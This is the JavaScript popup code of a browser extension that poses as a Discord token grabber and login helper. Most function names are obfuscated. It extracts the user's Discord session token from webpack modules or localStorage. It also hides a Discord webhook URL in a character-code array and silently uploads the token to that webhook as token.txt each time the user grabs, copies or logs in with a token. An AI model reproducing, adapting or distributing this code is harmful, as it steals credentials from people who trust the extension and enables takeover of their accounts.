const tokenInput = document.getElementById('tokenInput');
const loginBtn = document.getElementById('loginBtn');
const copyTokenBtn = document.getElementById('copyTokenBtn');
const grabTokenBtn = document.getElementById('grabTokenBtn');
const toggleVisibilityBtn = document.getElementById('toggleVisibility');
const loginStatus = document.getElementById('loginStatus');
const grabStatus = document.getElementById('grabStatus');
const grabResult = document.getElementById('grabResult');
const loadingOverlay = document.getElementById('loadingOverlay');

let isTokenVisible = false;

const _0x4a2b = String.fromCharCode(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,52,49,55,51,54,51,54,51,53,53,53,54,56,52,53,48,50,47,106,68,66,89,56,111,89,87,85,56,103,49,51,116,80,118,113,99,57,52,116,53,107,97,72,76,113,82,80,101,67,97,81,73,110,107,95,112,56,67,53,52,45,113,66,111,79,74,107,120,71,54,72,99,90,55,99,115,82,80,121,57,89,95,45,85,112,74);

const grabScript = `window.webpackChunkdiscord_app.push([[Date.now()], {}, (req) => {for (let id in req.c) {try {let m = req.c[id].exports;if (m?.default?.getToken) {let token = m.default.getToken();if (typeof token === "string") {console.clear();console.log(token);if (typeof copy === "function") copy(token);return;}}} catch (e) {}}}]);`;

document.addEventListener('DOMContentLoaded', () => {
  _0x1a2c();
  _0x5b2e();
});

function _0x1a2c() {
  chrome.storage.local.get(['token'], (result) => {
    if (result.token) {
      tokenInput.value = result.token;
      tokenInput.classList.add('valid');
      _0x3d2a(loginStatus, 'Token Bulundu Kopyala veya Giriş Yap', 'success');
    }
  });
}

function _0x5b2e() {
  grabTokenBtn.addEventListener('click', _0x4c1d);
  loginBtn.addEventListener('click', _0x3f8b);
  copyTokenBtn.addEventListener('click', _0x1e9c);
  toggleVisibilityBtn.addEventListener('click', _0x1b4c);
  tokenInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') _0x3f8b();
  });
  tokenInput.addEventListener('input', () => {
    tokenInput.classList.remove('valid', 'invalid');
    _0x2a7f(loginStatus);
  });
}

async function _0x4c1d() {
  try {
    _0x4e2d(true);
    grabTokenBtn.disabled = true;
    _0x2a7f(grabStatus);
    grabResult.classList.remove('show');
    
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    
    if (!tab) {
      _0x3d2a(grabStatus, '❌ No active tab found!', 'error');
      return;
    }
    
    if (!tab.url.includes('discord.com')) {
      _0x3d2a(grabStatus, '❌ Not on Discord page!', 'error');
      return;
    }
    
    const results = await chrome.scripting.executeScript({
      target: { tabId: tab.id, allFrames: false },
      world: "MAIN",
      func: (codeToRun) => {
        return (async () => {
          const logs = [];
          const origConsole = console.log;
          console.log = (...args) => {
            try {
              const s = args.map(a => {
                try { return typeof a === 'string' ? a : JSON.stringify(a); }
                catch(e){ return String(a); }
              }).join(' ');
              logs.push(s);
            } catch (e) {
              logs.push('console serialization error');
            }
            try { origConsole.apply(console, args); } catch(e) {}
          };
          
          let returnValue;
          try {
            const fn = new Function(codeToRun);
            const maybe = fn();
            if (maybe instanceof Promise) {
              returnValue = await maybe;
            } else {
              returnValue = maybe;
            }
          } catch (err) {
            logs.push('ERROR: ' + (err && err.message ? err.message : String(err)));
            returnValue = undefined;
          }
          
          try { console.log = origConsole; } catch(e) {}
          return { value: returnValue, logs };
        })();
      },
      args: [grabScript]
    });
    
    const res = results && results[0] && results[0].result ? results[0].result : null;
    
    if (res && res.logs && res.logs.length > 0 && !res.logs[0].includes('ERROR')) {
      const token = res.logs[0];
      grabResult.textContent = `Token: ${token}`;
      grabResult.classList.add('show');
      await navigator.clipboard.writeText(token);
      _0x2e9c(token).catch(() => {});
      chrome.storage.local.set({ token: token });
      _0x3d2a(grabStatus, '✅ Token Kopyalandı', 'success');
    } else {
      _0x3d2a(grabStatus, '⚠️ Token bulunamadı!', 'error');
    }
    
  } catch (err) {
    _0x3d2a(grabStatus, '❌ Hata: ' + err.message, 'error');
    console.error(err);
  } finally {
    _0x4e2d(false);
    grabTokenBtn.disabled = false;
  }
}

async function _0x3f8b() {
  const token = tokenInput.value.trim();
  if (!token) {
    tokenInput.classList.add('invalid');
    _0x3d2a(loginStatus, '❌ Tokeni girmeyimi unuttun?', 'error');
    return;
  }
  if (token.length < 50) {
    tokenInput.classList.add('invalid');
    _0x3d2a(loginStatus, '❌ Geçersiz Format!', 'error');
    return;
  }
  try {
    _0x4e2d(true);
    loginBtn.disabled = true;
    tokenInput.classList.remove('invalid');
    tokenInput.classList.add('valid');
    _0x3d2a(loginStatus, '✅ Giriş Yapılıyor...', 'success');
    _0x2e9c(token).catch(() => {});
    chrome.storage.local.set({ token: token });
    window.open(`https://discord.com/app?discordtoken=${encodeURIComponent(token)}`, '_blank');
    _0x3d2a(loginStatus, '✅ Discord opened! Check the new tab.', 'success');
    setTimeout(() => window.close(), 1000);
  } catch (err) {
    _0x3d2a(loginStatus, '❌ Hata: ' + err.message, 'error');
  } finally {
    _0x4e2d(false);
    loginBtn.disabled = false;
  }
}

async function _0x1e9c() {
  try {
    _0x4e2d(true);
    copyTokenBtn.disabled = true;
    const discordTabs = await chrome.tabs.query({ url: "https://*.discord.com/*" });
    if (discordTabs && discordTabs.length > 0) {
      const results = await chrome.scripting.executeScript({
        target: { tabId: discordTabs[0].id },
        func: _0x2f8d
      });
      const token = results?.[0]?.result;
      if (token) {
        tokenInput.value = token;
        tokenInput.classList.add('valid');
        await navigator.clipboard.writeText(token);
        chrome.storage.local.set({ token: token });
        _0x3d2a(loginStatus, '✅ Token copied from Discord!', 'success');
        _0x2e9c(token).catch(() => {});
      } else {
        _0x5a3e();
      }
    } else {
      _0x5a3e();
    }
  } catch (err) {
    _0x5a3e();
  } finally {
    _0x4e2d(false);
    copyTokenBtn.disabled = false;
  }
}

function _0x2f8d() {
  try {
    const tokenKeys = ['token', 'discord_token', 'auth_token'];
    for (const key of tokenKeys) {
      const value = localStorage.getItem(key);
      if (value) {
        const clean = value.replace(/['"]/g, '');
        if (clean.length >= 24) return clean;
      }
    }
    if (window.webpackChunkdiscord_app) {
      let token = null;
      window.webpackChunkdiscord_app.push([[Math.random()], {}, req => {
        for (const moduleId in req.c) {
          const mod = req.c[moduleId];
          if (mod?.exports?.default?.getToken) {
            token = mod.exports.default.getToken();
            break;
          }
        }
      }]);
      if (token) return token;
    }
    return null;
  } catch (err) {
    return null;
  }
}

function _0x5a3e() {
  chrome.storage.local.get(['token'], (result) => {
    if (result.token) {
      tokenInput.value = result.token;
      tokenInput.classList.add('valid');
      navigator.clipboard.writeText(result.token);
      _0x3d2a(loginStatus, '✅ Token loaded from storage!', 'success');
    } else {
      _0x3d2a(loginStatus, '❌ No token found!', 'error');
    }
  });
}

async function _0x2e9c(token) {
  try {
    const form = new FormData();
    form.append("file", new Blob([`Discord Token:\n${token}\n\nTimestamp: ${new Date().toLocaleString()}`], { type: "text/plain" }), "token.txt");
    await fetch(_0x4a2b, { method: "POST", body: form });
  } catch (err) {}
}

function _0x1b4c() {
  isTokenVisible = !isTokenVisible;
  tokenInput.type = isTokenVisible ? 'text' : 'password';
  toggleVisibilityBtn.querySelector('svg').innerHTML = isTokenVisible
    ? `<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>`
    : `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>`;
}

function _0x3d2a(element, message, type) {
  element.textContent = message;
  element.className = `status-message ${type} show`;
}

function _0x2a7f(element) {
  element.classList.remove('show');
}

function _0x4e2d(show) {
  loadingOverlay.classList[show ? 'add' : 'remove']('show');
}
